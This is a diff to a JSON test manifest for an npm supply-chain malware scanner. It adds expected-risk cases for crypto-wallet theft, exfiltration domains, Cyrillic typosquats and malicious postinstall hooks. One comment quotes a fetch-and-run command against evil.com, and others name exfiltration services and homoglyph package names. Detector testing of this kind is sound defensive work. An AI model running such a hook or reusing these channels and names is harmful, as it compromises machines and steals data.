@@ -2,7 +2,7 @@
     "test_cases": [
         {
             "name": "clean-project",
-            "path": "test-cases/clean-project",
+            "path": "../shai-hulud-detect/test-cases/clean-project",
             "expected_risks": [],
             "description": "Should show no issues - clean project with no compromised packages",
             "files": [
@@ -17,7 +17,7 @@
         },
         {
             "name": "infected-project",
-            "path": "test-cases/infected-project",
+            "path": "../shai-hulud-detect/test-cases/infected-project",
             "expected_risks": [
                 "HIGH",
                 "MEDIUM"
@@ -119,7 +119,7 @@
         },
         {
             "name": "chalk-debug-attack",
-            "path": "test-cases/chalk-debug-attack",
+            "path": "../shai-hulud-detect/test-cases/chalk-debug-attack",
             "expected_risks": [
                 "HIGH"
             ],
@@ -165,7 +165,7 @@
         },
         {
             "name": "network-exfiltration-project",
-            "path": "test-cases/network-exfiltration-project",
+            "path": "../shai-hulud-detect/test-cases/network-exfiltration-project",
             "expected_risks": [
                 "HIGH"
             ],
@@ -191,7 +191,7 @@
         },
         {
             "name": "legitimate-crypto",
-            "path": "test-cases/legitimate-crypto",
+            "path": "../shai-hulud-detect/test-cases/legitimate-crypto",
             "expected_risks": [
                 "MEDIUM"
             ],
@@ -227,7 +227,7 @@
         },
         {
             "name": "common-crypto-libs",
-            "path": "test-cases/common-crypto-libs",
+            "path": "../shai-hulud-detect/test-cases/common-crypto-libs",
             "expected_risks": [
                 "MEDIUM"
             ],
@@ -263,7 +263,7 @@
         },
         {
             "name": "typosquatting-project",
-            "path": "test-cases/typosquatting-project",
+            "path": "../shai-hulud-detect/test-cases/typosquatting-project",
             "expected_risks": [
                 "MEDIUM"
             ],
@@ -285,7 +285,7 @@
         },
         {
             "name": "comprehensive-test",
-            "path": "test-cases/comprehensive-test",
+            "path": "../shai-hulud-detect/test-cases/comprehensive-test",
             "expected_risks": [
                 "HIGH"
             ],
@@ -324,7 +324,7 @@
         },
         {
             "name": "mixed-project",
-            "path": "test-cases/mixed-project",
+            "path": "../shai-hulud-detect/test-cases/mixed-project",
             "expected_risks": [
                 "MEDIUM"
             ],
@@ -353,7 +353,7 @@
         },
         {
             "name": "semver-matching",
-            "path": "test-cases/semver-matching",
+            "path": "../shai-hulud-detect/test-cases/semver-matching",
             "expected_risks": [
                 "MEDIUM"
             ],
@@ -372,7 +372,7 @@
         },
         {
             "name": "namespace-warning",
-            "path": "test-cases/namespace-warning",
+            "path": "../shai-hulud-detect/test-cases/namespace-warning",
             "expected_risks": [
                 "LOW"
             ],
@@ -392,7 +392,7 @@
         },
         {
             "name": "debug-js",
-            "path": "test-cases/debug-js",
+            "path": "../shai-hulud-detect/test-cases/debug-js",
             "expected_risks": [
                 "MEDIUM"
             ],
@@ -411,7 +411,7 @@
         },
         {
             "name": "legitimate-security-project",
-            "path": "test-cases/legitimate-security-project",
+            "path": "../shai-hulud-detect/test-cases/legitimate-security-project",
             "expected_risks": [
                 "MEDIUM"
             ],
@@ -441,7 +441,7 @@
         },
         {
             "name": "false-positive-project",
-            "path": "test-cases/false-positive-project",
+            "path": "../shai-hulud-detect/test-cases/false-positive-project",
             "expected_risks": [
                 "LOW"
             ],
@@ -475,7 +475,7 @@
         },
         {
             "name": "edge-case-project",
-            "path": "test-cases/edge-case-project",
+            "path": "../shai-hulud-detect/test-cases/edge-case-project",
             "expected_risks": [
                 "LOW"
             ],
@@ -494,7 +494,7 @@
         },
         {
             "name": "infected-lockfile",
-            "path": "test-cases/infected-lockfile",
+            "path": "../shai-hulud-detect/test-cases/infected-lockfile",
             "expected_risks": [],
             "description": "Should show no issues - empty directory for lockfile testing",
             "files": [
@@ -509,7 +509,7 @@
         },
         {
             "name": "infected-lockfile-pnpm",
-            "path": "test-cases/infected-lockfile-pnpm",
+            "path": "../shai-hulud-detect/test-cases/infected-lockfile-pnpm",
             "expected_risks": [
                 "HIGH"
             ],
@@ -528,7 +528,7 @@
         },
         {
             "name": "git-branch-test",
-            "path": "test-cases/git-branch-test",
+            "path": "../shai-hulud-detect/test-cases/git-branch-test",
             "expected_risks": [
                 "MEDIUM"
             ],
@@ -565,7 +565,7 @@
         },
         {
             "name": "multi-hash-detection",
-            "path": "test-cases/multi-hash-detection",
+            "path": "../shai-hulud-detect/test-cases/multi-hash-detection",
             "expected_risks": [],
             "description": "Should show no issues - test files for hash detection without malicious content",
             "files": [
@@ -699,6 +699,119 @@
                         "wget_download_malware"
                     ],
                     "purpose": "Tests detection of malicious npm lifecycle scripts that compromise systems during package installation."
+                }
+            ]
+        },
+        {
+            "name": "crypto-theft-test",
+            "path": "test-cases/crypto-theft-test",
+            "expected_risks": [
+                "HIGH"
+            ],
+            "description": "Should show HIGH risk - contains cryptocurrency theft patterns and wallet hijacking",
+            "files": [
+                {
+                    "file": "malicious.js",
+                    "risk_level": "HIGH",
+                    "comment": "Contains XMLHttpRequest prototype modification, known attacker wallet addresses, and crypto theft patterns from the September 8 attack.",
+                    "patterns_detected": [
+                        "xmlhttprequest_modification",
+                        "crypto_wallet_hijacking",
+                        "attacker_wallet_addresses",
+                        "npmjs_help_phishing"
+                    ],
+                    "purpose": "Tests detection of cryptocurrency theft malware with wallet manipulation and exfiltration."
+                }
+            ]
+        },
+        {
+            "name": "extended-network-exfiltration",
+            "path": "test-cases/extended-network-exfiltration",
+            "expected_risks": [
+                "MEDIUM"
+            ],
+            "description": "Should show MEDIUM risk - comprehensive network exfiltration patterns including 15+ suspicious domains and private IP detection",
+            "files": [
+                {
+                    "file": "advanced-exfiltration.js",
+                    "risk_level": "MEDIUM",
+                    "comment": "Comprehensive network exfiltration with multiple suspicious domains: pastebin.com, hastebin.com, ix.io, discord.com/api/webhooks, telegram.org, ngrok.io, requestbin.com. Also contains hardcoded private IPs (10.0.1.100, 192.168.2.50, 172.20.0.10) and C2 patterns with IP:Port combinations.",
+                    "patterns_detected": [
+                        "extended_suspicious_domains",
+                        "pastebin_family_domains",
+                        "discord_webhook_exfiltration",
+                        "telegram_exfiltration",
+                        "ngrok_tunnel_usage",
+                        "private_ip_hardcoded_extended",
+                        "c2_ip_port_patterns",
+                        "tunnel_service_abuse"
+                    ],
+                    "purpose": "Tests comprehensive detection of 15+ suspicious domains, private IP patterns, and advanced C2 communication channels used for data exfiltration."
+                }
+            ]
+        },
+        {
+            "name": "extended-typosquatting-test",
+            "path": "test-cases/extended-typosquatting-test",
+            "expected_risks": [
+                "MEDIUM"
+            ],
+            "description": "Should show MEDIUM risk - comprehensive typosquatting detection including 25+ popular packages with Cyrillic/Unicode substitutions",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "MEDIUM",
+                    "comment": "Comprehensive typosquatting test with popular packages: 'rеact' (Cyrillic е), 'vuе' (Cyrillic е), 'ехpress' (Cyrillic х), 'аngular' (Cyrillic а), 'lоdash' (Cyrillic о), 'aхios' (Cyrillic х), and character omission variants like 'webpck', 'bable', 'eslnt'.",
+                    "patterns_detected": [
+                        "extended_typosquatting",
+                        "cyrillic_homoglyphs",
+                        "unicode_substitution_advanced",
+                        "popular_package_typosquat",
+                        "character_omission_typosquat"
+                    ],
+                    "purpose": "Tests comprehensive detection of typosquatting against 25+ popular packages with advanced Unicode and Cyrillic character substitutions."
+                }
+            ]
+        },
+        {
+            "name": "postinstall-hooks-test",
+            "path": "test-cases/postinstall-hooks-test",
+            "expected_risks": [
+                "HIGH"
+            ],
+            "description": "Should show HIGH risk - contains suspicious postinstall hooks that download and execute malware",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "HIGH",
+                    "comment": "Contains malicious postinstall script: 'wget -O /tmp/malware.sh https://evil.com/malware && bash /tmp/malware.sh' - downloads and executes remote malware during installation.",
+                    "patterns_detected": [
+                        "suspicious_postinstall_hook",
+                        "remote_code_execution",
+                        "wget_download_malware"
+                    ],
+                    "purpose": "Tests detection of malicious npm lifecycle scripts that compromise systems during package installation."
+                }
+            ]
+        },
+        {
+            "name": "shai-hulud-repo-detection",
+            "path": "test-cases/shai-hulud-repo-detection",
+            "expected_risks": [
+                "HIGH"
+            ],
+            "description": "Should show HIGH risk - repository patterns that indicate Shai-Hulud related activity",
+            "files": [
+                {
+                    "file": ".git/config",
+                    "risk_level": "HIGH",
+                    "comment": "Git repository with shai-hulud remote URL patterns indicating potential repository migration or related activity.",
+                    "patterns_detected": [
+                        "shai_hulud_repo_name",
+                        "migration_pattern_repo",
+                        "git_remote_shai_hulud"
+                    ],
+                    "purpose": "Tests detection of repositories with Shai-Hulud naming patterns and migration indicators."
                 }
             ]
         }
